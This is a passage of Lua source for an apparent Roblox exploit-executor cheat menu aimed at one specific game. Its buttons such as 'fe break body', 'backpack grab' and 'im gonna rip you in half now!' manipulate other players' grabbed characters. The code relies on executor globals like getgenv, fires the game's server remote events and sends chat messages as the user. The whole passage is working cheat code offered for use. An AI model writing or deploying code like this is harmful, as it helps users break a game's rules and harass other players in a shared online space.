_G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
    if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
        repeat task.wait() until Ins.Part0 ~= nil
        repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
        
        local AT0, AT1, AP, A0
        
        if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
            Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
            
            Character.Animate.Disabled = true
            
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
            
            Character.Humanoid:LoadAnimation(IM.RightAim):Play()
            Character.Humanoid:LoadAnimation(IM.LeftAim):Play()
            
            AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 2), Vector3.new(20, 180, 0))
            
            spawn(function()
                while Ins.Parent ~= nil do
                    task.wait()
                    local Sine = tick() * 60
                    
                    AT1.Position = Vector3.new(0, 0.5, -1.7 + 0.4 * math.sin(Sine / 9))
                end
            end)
        end
        
        repeat task.wait() until Ins.Parent == nil
        
        
        
        Character.Animate.Disabled = true
            
    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
        Anim:Stop()
    end
    
    Character.Animate.Disabled = false
        
        AT0:Destroy()
        AT1:Destroy()
        AP:Destroy()
        A0:Destroy()
    end
end)
end)

Section:NewButton("fe break body", "breaks the guy you grab body", function()
--fe break body
if game.PlaceId ~= 2788229376 then return end

        if getgenv().GrabWatcher then
            getgenv().GrabWatcher:Disconnect()
            getgenv().GrabWatcher = nil
            wait()
        end
        
        local LocalPlayer = game.Players.LocalPlayer
        local Character = LocalPlayer.Character
        
        local BodyEffects = Character.BodyEffects
        
        local Mouse = LocalPlayer:GetMouse()
        
        local workPlayers = workspace.Players
        
        local LiveConnections = {}
        
        local function Align(P0, P1, Offset)
            return game:GetService("RunService").Heartbeat:Connect(function()
                P0.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                P0.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                P0.CFrame = P1.CFrame * (Offset or CFrame.new())
            end)
        end
        
        local function InsertOn(Table, Value)
            if type(Table) == "table" and Value then
                Table[#Table + 1] = Value
            end
        end
        
        local function Loop(Name, Callback)
            if game:GetService("RunService")[Name] then
                local CurrentLoop
                CurrentLoop = game:GetService("RunService")[Name]:Connect(function()
                    local Result, Output = pcall(Callback)
                    
                    if not Result then
                        CurrentLoop:Disconnect()
                        warn(Output)
                    end
                end)
                
                return CurrentLoop
            end
        end
        
        local function CloneCharacter(Player)
            Player.Archivable = true
            
            local newClone = Player:Clone()
            newClone.Humanoid.RootPart.Anchored = false
            newClone["GRABBING_CONSTRAINT"]:Destroy()
            newClone.RagdollConstraints:Destroy()
            newClone.Humanoid.RootPart.CFrame = newClone.Humanoid.RootPart.CFrame * CFrame.new(0, 2, 0)
            
            newClone.Animate.Disabled = true
            task.wait()
            newClone.Animate.Disabled = false
            
            newClone.Humanoid:ChangeState("GettingUp")
            
            newClone.Parent = Character
            
            for _, Class in pairs(newClone:GetDescendants()) do
                if Class:IsA("BasePart") then
                    Class.Massless = false
                    Class.Transparency = 1
                end
                
                if Class:IsA("Decal") then
                    Class.Transparency = 1
                end
            end
            
            Player.Archivable = false
            
            return newClone
        end
        
        local function onGrab()
            if BodyEffects.Grabbed.Value then
                wait()
                local GrabbedCharacter = BodyEffects.Grabbed.Value
                local GrabConstraint = GrabbedCharacter:WaitForChild("GRABBING_CONSTRAINT")
                
                if not GrabConstraint then return end
                
                local RopeGrab = GrabConstraint:FindFirstChildOfClass("RopeConstraint")
                
                RopeGrab.Length = 1/0
                
                local Origin
                
                Character.Humanoid.RootPart.CFrame = Character.Humanoid.RootPart.CFrame * CFrame.new(0, -25, 0)
                
                local PlayerClone = CloneCharacter(GrabbedCharacter)
                
                workspace.CurrentCamera.CameraSubject = PlayerClone
                
                local RayParams = RaycastParams.new()
                RayParams.FilterDescendantsInstances = {Character, GrabbedCharacter}
                RayParams.IgnoreWater = true
                
                InsertOn(LiveConnections, Loop("Heartbeat", function()
                    local RootPartPosition = PlayerClone.Humanoid.RootPart.CFrame.Position
                    local RaycastResult = workspace:Raycast(RootPartPosition, RootPartPosition - Vector3.new(0, 9e9, 0), RayParams)
                    
                    local Position = Vector3.new()
                    
                    if RaycastResult and RaycastResult.Instance ~= nil then
                        Position = RaycastResult.Position - Vector3.new(0, PlayerClone.Humanoid.RootPart.Size.Y * 5, 0)
                    end
                    
                    Character.Humanoid.RootPart.CFrame = CFrame.new(Vector3.new(Position.X, -Position.Y, Position.Z)) * CFrame.Angles(math.rad(90), 0, 0)
                end))
                
                InsertOn(LiveConnections, Loop("Stepped", function()
                    PlayerClone.Humanoid.Jump = Character.Humanoid.Jump
                    PlayerClone.Humanoid:Move(Character.Humanoid.MoveDirection, false)
                    
                    for _, Class in pairs(GrabbedCharacter:GetDescendants()) do
                        if Class:IsA("BasePart") then
                            Class.CanCollide = false
                        end
                    end
                end))
                
                for _, Class in pairs(PlayerClone:GetChildren()) do
                    if Class:IsA("BasePart") and GrabbedCharacter:FindFirstChild(Class.Name) and Class.Name ~= RopeGrab.Attachment1.Parent then
                        InsertOn(LiveConnections, 
                            Align(
                                GrabbedCharacter:FindFirstChild(Class.Name), 
                                Class, 
                                CFrame.new(0, 0, 0)
                            )
                        )
                    end
                end
                
                local function Stop()
                    for _ = 1, 10 do
                        game:GetService("RunService").RenderStepped:Wait()
                        Character.Humanoid.RootPart.CFrame = CFrame.new(PlayerClone.PrimaryPart.CFrame.Position) * CFrame.new(0, 5, 0)
                        Character.Humanoid.RootPart.Velocity = Vector3.zero
                    end
                    
                    PlayerClone:Destroy()
                    
                    workspace.CurrentCamera.CameraSubject = Character
                    
                    for _, Connection in pairs(LiveConnections) do
                        Connection:Disconnect()
                    end
                end
                
                local Ungrabbed
                
                Ungrabbed = BodyEffects.Grabbed.Changed:Connect(function()
                    if BodyEffects.Grabbed.Value == nil then
                        Stop()
                        Ungrabbed:Disconnect()
                    end
                end)
            end
        end
        
        getgenv().GrabWatcher = BodyEffects.Grabbed:GetPropertyChangedSignal("Value"):Connect(onGrab)
end)

Section:NewButton("foot Grab v1", "foot grab", function()
            local LocalPlayer = game.Players.LocalPlayer
            local Character = LocalPlayer.Character
            
            local IM = game:GetService("ReplicatedStorage").IM.ANIM
            
            local PlayersChar = workspace.Players
            
            if _G.JOINTWATCHER then
                _G.JOINTWATCHER:Disconnect()
            end
            
            local function Align(P0, P1, P, R)
                local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
                
                local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
                
                A1.Position = P
                A0.Rotation = R
                
                AP.RigidityEnabled = true
                AP.Responsiveness = 200
                AP.Attachment0 = A0
                AP.Attachment1 = A1
                
                AO.MaxTorque = 9e9
                AO.Responsiveness = 200
                AO.RigidityEnabled = true
                AO.Attachment0 = A0
                AO.Attachment1 = A1
                
                return A0, A1, AP, A0
            end
            
            _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
                if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                    repeat task.wait() until Ins.Part0 ~= nil
                    repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                    
                    local AT0, AT1, AP, A0
                    
                    if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                        Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                        
                        Character.Animate.Disabled = true
                        
                        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                            Anim:Stop()
                        end
                        
                        Character.Animate.Disabled = false
                        
                        Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                        
                        AT0, AT1, AP, A0 = Align(Ins.Parent.RightLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 0), Vector3.new(270, 0, 0))
                        
                        
                        spawn(function()
                            while Ins.Parent ~= nil do
                                task.wait()
                                local Sine = tick() * 60
                                
                                AT1.Position = Vector3.new(0, -0.5, 0 + 0 * math.sin(Sine / 8))
                            end
                        end)
                    end
                    
                    repeat task.wait() until Ins.Parent == nil
                    
                    Character.Animate.Disabled = true
                        
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                    
                    AT0:Destroy()
                    AT1:Destroy()
                    AP:Destroy()
                    A0:Destroy()
                end
            end)
            end)

Section:NewButton("backpack grab", "backpack the grabbed person", function()
local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 0), Vector3.new(20, 545, 0))
                
                
                
                spawn(function()
                    while Ins.Parent ~= nil do
                        task.wait()
                        local Sine = tick() * 60
                        
                        AT1.Position = Vector3.new(0, 1, 1.3 + 0 * math.sin(Sine / 8))
                    end
                end)
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("backpack v2", "backback the grabbed player", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 0), Vector3.new(180, 0, 0))
                
                
                spawn(function()
                    while Ins.Parent ~= nil do
                        task.wait()
                        local Sine = tick() * 60
                        
                        AT1.Position = Vector3.new(0, 1, 1.5 + 0 * math.sin(Sine / 8))
                    end
                end)
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("spin grab", "spin grab", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 10), Vector3.new(90, 0, 0))
                AT0, AT1, AP, A0 = Align(Ins.Parent.RightLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(5, 5, 0), Vector3.new(0, 0, 0))
                AT0, AT1, AP, A0 = Align(Ins.Parent.LeftLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 5, 0), Vector3.new(0, 0, 0))
                
                spawn(function()
                    while Ins.Parent ~= nil do
                        task.wait()
                        local Sine = tick() * 60
                        
                        AT1.Position = Vector3.new(0, 5, 0 + 0 * math.sin(Sine / 5)) --0.5
                    end
                end)
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("merga grab", "merga grab", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 0), Vector3.new(90, 0, 0))
                AT0, AT1, AP, A0 = Align(Ins.Parent.RightLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(-2, 10, 0), Vector3.new(0, 0, 0))
                AT0, AT1, AP, A0 = Align(Ins.Parent.LeftLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(-2, 5, 0), Vector3.new(0, 0, 0))
                
                spawn(function()
                    while Ins.Parent ~= nil do
                        task.wait()
                        local Sine = tick() * 60
                        
                        AT1.Position = Vector3.new(0, 5, 0 + 0 * math.sin(Sine / 5)) --0.5
                    end
                end)
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("merga v2 grab", "merga v2 grab", function()
        local LocalPlayer = game.Players.LocalPlayer
        local Character = LocalPlayer.Character
        
        local IM = game:GetService("ReplicatedStorage").IM.ANIM
        
        local PlayersChar = workspace.Players
        
        if _G.JOINTWATCHER then
            _G.JOINTWATCHER:Disconnect()
        end
        
        local function Align(P0, P1, P, R)
            local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
            
            local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
            
            A1.Position = P
            A0.Rotation = R
            
            AP.RigidityEnabled = true
            AP.Responsiveness = 200
            AP.Attachment0 = A0
            AP.Attachment1 = A1
            
            AO.MaxTorque = 9e9
            AO.Responsiveness = 200
            AO.RigidityEnabled = true
            AO.Attachment0 = A0
            AO.Attachment1 = A1
            
            return A0, A1, AP, A0
        end
        
        _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
            if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                repeat task.wait() until Ins.Part0 ~= nil
                repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                
                local AT0, AT1, AP, A0
                
                if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                    Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                    
                    Character.Animate.Disabled = true
                    
                    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                        Anim:Stop()
                    end
                    
                    Character.Animate.Disabled = false
                    
                    Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                    
                    AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 0), Vector3.new(90, 545, 0))
                end
                
                repeat task.wait() until Ins.Parent == nil
                
                Character.Animate.Disabled = true
                    
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
                
                AT0:Destroy()
                AT1:Destroy()
                AP:Destroy()
                A0:Destroy()
            end
        end)
end)

Section:NewButton("gojo grab", "????", function()
    local LocalPlayer = game.Players.LocalPlayer
local Character = LocalPlayer.Character

local IM = game:GetService("ReplicatedStorage").IM.ANIM

local PlayersChar = workspace.Players

if _G.JOINTWATCHER then
    _G.JOINTWATCHER:Disconnect()
end

local function Align(P0, P1, P, R)
    local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
    
    local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
    
    A1.Position = P
    A0.Rotation = R
    
    AP.RigidityEnabled = true
    AP.Responsiveness = 200
    AP.Attachment0 = A0
    AP.Attachment1 = A1
    
    AO.MaxTorque = 9e9
    AO.Responsiveness = 200
    AO.RigidityEnabled = true
    AO.Attachment0 = A0
    AO.Attachment1 = A1
    
    return A0, A1, AP, A0
end

_G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
    if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
        repeat task.wait() until Ins.Part0 ~= nil
        repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
        
        local AT0, AT1, AP, A0
        
        if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
            Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
            
            Character.Animate.Disabled = true
            
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
            
            Character.Humanoid:LoadAnimation(IM.RightAim):Play()
            
            AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 0), Vector3.new(90, 0, 0))
            AT0, AT1, AP, A0 = Align(Ins.Parent.RightUpperLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 5), Vector3.new(0, 0, 0))
            AT0, AT1, AP, A0 = Align(Ins.Parent.LeftUpperLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 5), Vector3.new(0, 0, 0))
            AT0, AT1, AP, A0 = Align(Ins.Parent.RightLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 5), Vector3.new(0, 0, 0))
            AT0, AT1, AP, A0 = Align(Ins.Parent.LeftLowerLeg, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 5), Vector3.new(0, 0, 0))
        end
        
        repeat task.wait() until Ins.Parent == nil
        
        Character.Animate.Disabled = true
            
    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
        Anim:Stop()
    end
    
    Character.Animate.Disabled = false
        
        AT0:Destroy()
        AT1:Destroy()
        AP:Destroy()
        A0:Destroy()
    end
end)
end)

Section:NewButton("im gonna rip you in half now!", "rip body", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

function notify(title, text, icon, duration)
    game.StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = icon,
        Duration = duration
    })
end

function chat(msg)
    local A_1 = msg
    local A_2 = "All"
    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    Event:FireServer(A_1, A_2)
end

local function kick()
    local KIckAnim = Instance.new('Animation')
    KIckAnim.AnimationId = "rbxassetid://13850675130"
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Rip In Half"
    
    tool.Activated:Connect(function()
        local grabbedValue = game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value
        if not grabbedValue then
            notify("cannot active tool drag player first", "drag player first to work", "rbxthumb://type=Asset&id=9915433572&w=150&h=150", 4)
            return
        end
        
        wait(.1)
        chat("I’m gonna rip you in half now.")
        Play(7148332723)
        wait(2.3)
        Play(4752240968)
        local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
        if humanoid then
            wait(0.3) humanoid:LoadAnimation(KIckAnim):Play()
        end
        wait(0.1)
        
        local grabbedCharacter = game.Players:GetPlayerFromCharacter(grabbedValue).Character
        if grabbedCharacter then
            -- Adjust LowerTorso position
            local lowerTorso = grabbedCharacter:FindFirstChild("LowerTorso")
            if lowerTorso then
                lowerTorso.Position = Vector3.new(0, -1200, 0)
            end

            local RightUpperArm = grabbedCharacter:FindFirstChild("RightUpperArm")
            if RightUpperArm then
                RightUpperArm.Position = Vector3.new(0, -1200, 0)
            end

           local LeftUpperArm = grabbedCharacter:FindFirstChild("LeftUpperArm")
            if LeftUpperArm then
                LeftUpperArm.Position = Vector3.new(0, -1200, 0)
            end

           local RightUpperLeg = grabbedCharacter:FindFirstChild("RightUpperLeg")
            if RightUpperLeg then
                RightUpperLeg.Position = Vector3.new(0, -1200, 0)
            end

           local LeftUpperLeg = grabbedCharacter:FindFirstChild("LeftUpperLeg")
            if LeftUpperLeg then
                LeftUpperLeg.Position = Vector3.new(0, -1200, 0)
            end
        end
        
        wait(0.1)
        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
    end)
    
    tool.Parent = game.Players.LocalPlayer.Backpack
end

    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
local DefaultDanceanim = Instance.new('Animation')
DefaultDanceanim.AnimationId = "rbxassetid://3135389157"

local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
local animation = humanoid:LoadAnimation(DefaultDanceanim)

animation:Play()
animation.TimePosition = 0
animation:AdjustSpeed(0.2)

            local DefaultDanceanim2 = Instance.new('Animation')
            DefaultDanceanim2.AnimationId = "rbxassetid://3135389157"
            
            local humanoid = Character:FindFirstChildWhichIsA('Humanoid')
            local animation2 = humanoid:LoadAnimation(DefaultDanceanim2)

            -- Make the animation slower
            animation2:Play()
            animation2.TimePosition = 0.1
            animation2:AdjustSpeed(0)               
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(1, -0, -0), Vector3.new(90, 70, 160))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)

game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR')
kick()
end)

Section:NewButton("hifgg break arms remake", "rip body", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
